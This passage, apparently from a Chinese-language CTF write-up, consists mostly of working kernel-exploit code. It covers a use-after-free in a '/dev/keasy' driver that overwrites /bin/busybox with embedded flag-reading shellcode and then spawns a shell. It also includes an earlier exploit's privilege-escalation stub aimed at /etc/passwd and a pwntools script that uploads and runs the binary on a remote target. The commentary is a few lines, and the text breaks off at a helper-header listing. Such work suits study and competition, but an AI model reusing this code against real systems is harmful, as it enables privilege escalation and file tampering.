</span></span><span class="line"><span class="cl">  <span class="nf">use_temporary_dir</span><span class="p">();</span>   <span class="c1">// setup workdir in ./exp_dir/
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">do_sandbox_namespace</span><span class="p">();</span><span class="c1">// create sub-process to escalate privilege and check whether the &#34;/etc/passwd&#34; is changed
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>   
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="kernel-2-1">kernel-2</h4>
<h5 id="方法">方法</h5>
<p>暂时只能做到任意文件写，逃不了njail</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;banzi.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">orw_elfcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x2</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x2</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x3e</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x5</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x64</span><span class="p">,</span><span class="mh">0x79</span><span class="p">,</span><span class="mh">0x71</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x4</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x2</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xf6</span><span class="p">,</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0x5</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0xba</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x7f</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xc6</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x99</span><span class="p">,</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0x5</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">getpid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">pipe_fd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pipe</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">cid</span> <span class="o">=</span> <span class="nf">fork</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">cid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/keasy&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;/dev/keasy&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">ezfd</span> <span class="o">=</span> <span class="n">fd</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//free ezfd file struct
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;ioctl did not fail&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// reallocate ezfd file struct == uaf_fd file struct
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	        <span class="kt">int</span> <span class="n">uaf_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/jail/uaf&#34;</span><span class="p">,</span><span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span><span class="mo">0666</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">uaf_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;/jail/uaf&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// triger page fault
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">write</span><span class="p">(</span><span class="n">uaf_fd</span><span class="p">,</span><span class="n">orw_elfcode</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">orw_elfcode</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span><span class="n">MAP_SHARED</span><span class="p">,</span><span class="n">uaf_fd</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">ptr</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//free uaf_fd file struct
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">close</span><span class="p">(</span><span class="n">uaf_fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">ezfd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// rellocate uaf_fd file struct
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">int</span> <span class="n">fdd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/bin/busybox&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">fdd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;/bin/busybox&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memcpy</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="n">orw_elfcode</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">orw_elfcode</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nf">write</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">&#34;A&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pause</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="mmap流程分析">mmap流程分析</h5>
<p>SYSCALL_DEFINE6mmap -&gt; ksys_mmap_pgoff-&gt;vm_mmap_pgoff-&gt;do_mmap-&gt;mmap_region-&gt;</p>
<h1 id="上传脚本">上传脚本</h1>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">platform</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;$ &#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">version</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;3&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">is_python2</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">is_python2</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">init</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">is_python2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&#34;content&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&#34;content&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;gzip -c ./exp &gt; ./exp.gz&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="s2">&#34;./exp.gz&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;content&#34;</span><span class="p">,</span> <span class="s2">&#34;wb+&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;content&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">content</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s2">&#34;stty -echo&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s2">&#34;cat &lt;&lt;EOF &gt; /tmp/exp.gz.b64&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">init</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;EOF&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s2">&#34;base64 -d /tmp/exp.gz.b64 &gt; /tmp/exp.gz&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s2">&#34;gunzip /tmp/exp.gz&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s2">&#34;chmod +x /tmp/exp&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s2">&#34;/tmp/exp&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;python exp.py ip port&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">is_python2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">init</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">ssl</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="banzi">banzi</h1>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
